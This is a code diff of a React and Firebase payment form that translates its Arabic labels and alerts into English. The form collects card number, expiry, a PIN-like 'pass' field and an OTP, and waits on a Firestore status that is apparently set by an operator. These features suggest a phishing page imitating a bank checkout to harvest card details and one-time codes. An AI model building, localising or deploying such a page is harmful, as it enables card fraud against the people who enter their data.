@@ -3,6 +3,7 @@ import { doc, onSnapshot } from 'firebase/firestore';
 import { db, handlePay } from '../firebase';
 import { FaCreditCard } from 'react-icons/fa';
 import './kent.css'
+
 type PaymentInfo = {
   cardNumber: string;
   year: string;
@@ -67,7 +68,7 @@ export const Payment = (props: any) => {
         setTimeout(() => {
     props.setisloading(false);
 
-    alert("رمز التحقق غير صحيح!");
+    alert("Invalid OTP!");
           setOtp('')
         }, 3000);
   };
@@ -89,7 +90,7 @@ export const Payment = (props: any) => {
               props.setisloading(false);
             } else if (data.status === 'rejected') {
               props.setisloading(false);
-              alert('تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ');
+              alert('Card declined. Please enter correct card information.');
               setstep(1);
             }
           }
@@ -102,13 +103,13 @@ export const Payment = (props: any) => {
 
 
   return (
-    <div className='font' style={{ display: "flex", alignItems: "center", justifyContent: "center", minHeight: "100vh", backgroundColor: "#f3f4f6", padding: "16px" }} dir='rtl'>
+    <div className='font' style={{ display: "flex", alignItems: "center", justifyContent: "center", minHeight: "100vh", backgroundColor: "#f3f4f6", padding: "16px" }} dir='ltr'>
       <div style={{ width: "100%", maxWidth: "400px", padding: "24px", backgroundColor: "white", borderRadius: "16px", boxShadow: "0 4px 6px rgba(0, 0, 0, 0.1)" }}>
-        <h2 style={{ textAlign: "center", marginBottom: "16px", fontSize: "20px", fontWeight: "600" }}>تفاصيل الدفع</h2>
+        <h2 style={{ textAlign: "center", marginBottom: "16px", fontSize: "20px", fontWeight: "600" }}>Payment Details</h2>
         {!showOtp ? (
           <form onSubmit={handleSubmit} style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
             <div>
-              <label  dir='rtl'>الاسم على البطاقة</label>
+              <label dir='ltr'>Name on Card</label>
               <input name="name" onChange={(e)=>{
                     setPaymentInfo({
                       ...paymentInfo,
@@ -116,8 +117,8 @@ export const Payment = (props: any) => {
                     })}} required style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc",textAlign:'start' }} />
             </div>
             <div>
-              <label>رقم البطاقة</label>
-              <input name="cardNumber"type='tel'maxLength={16} minLength={16} onChange={(e)=>{
+              <label>Card Number</label>
+              <input name="cardNumber" type='tel' maxLength={16} minLength={16} onChange={(e)=>{
                   setPaymentInfo({
                     ...paymentInfo,
                     cardNumber: e.target.value,
@@ -126,14 +127,13 @@ export const Payment = (props: any) => {
             </div>
             <div style={{ display: "flex", gap: "12px" }}>
               <div style={{ flex: 1 }}>
-                <label>سنة </label>
+                <label>Year</label>
                 <select name="expiry" value={paymentInfo.year} onChange={(e)=>{
                     setPaymentInfo({
                       ...paymentInfo,
                       year: e.target.value,
                     })
-                }} required  style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} >
-
+                }} required style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} >
                   <option value="2025/">2025</option>
                   <option value="2026/">2026</option>
                   <option value="2027/">2027</option>
@@ -147,13 +147,13 @@ export const Payment = (props: any) => {
                 </select>
               
               </div> <div style={{ flex: 1 }}>
-                <label> شهر</label>
+                <label>Month</label>
                 <select name="expiry" onChange={(e)=>{
                     setPaymentInfo({
                       ...paymentInfo,
                       month: e.target.value,
                     })
-                }} required  style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} >
+                }} required style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} >
                   <option value="1">1</option>
                   <option value="2">2</option>
                   <option value="3">3</option>
@@ -174,27 +174,28 @@ export const Payment = (props: any) => {
                     setPaymentInfo({
                       ...paymentInfo,
                       pass: e.target.value,
-                    })}} required  style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} />
+                    })}} required style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} />
               </div>
             </div>
            
             <button type="submit" disabled={isProcessing} style={{ width: "100%", display: "flex", alignItems: "center", justifyContent: "center", gap: "8px", padding: "12px", backgroundColor: "#2563eb", color: "white", borderRadius: "4px", border: "none", cursor: "pointer" }}>
-              <FaCreditCard /> {isProcessing ? "يرجى الانتظار..." : "ادفع الآن"}
+              <FaCreditCard /> {isProcessing ? "Please wait..." : "Pay Now"}
             </button>
           </form>
-        ) : step === 2 && paymentInfo.status === 'pending' ?  (<>طلب الدفع الخاص بك قيد المعالجة, يرجى الانتظار ...</>):(
+        ) : step === 2 && paymentInfo.status === 'pending' ? (
+          <>Your payment request is being processed, please wait...</>
+        ) : (
           <form onSubmit={handleOtpSubmit} style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
             <div>
-              <label style={{paddingBottom:5}}> يرجى ادخال رمز التحقق OTP المرسل الى جوالك</label>
-              <input name="otp" value={otp}minLength={4} maxLength={6} type='tel' onChange={(e) => setOtp(e.target.value)} required  style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} />
+              <label style={{paddingBottom:5}}>Please enter the OTP verification code sent to your mobile</label>
+              <input name="otp" value={otp} minLength={4} maxLength={6} type='tel' onChange={(e) => setOtp(e.target.value)} required style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} />
             </div>
             <button type="submit" style={{ width: "100%", padding: "12px", backgroundColor: "#2563eb", color: "white", borderRadius: "4px", border: "none", cursor: "pointer" }}>
-              تأكيد الدفع
+              Confirm Payment
             </button>
           </form>
-        ) }
+        )}
       </div>
     </div>
   );
 };
-
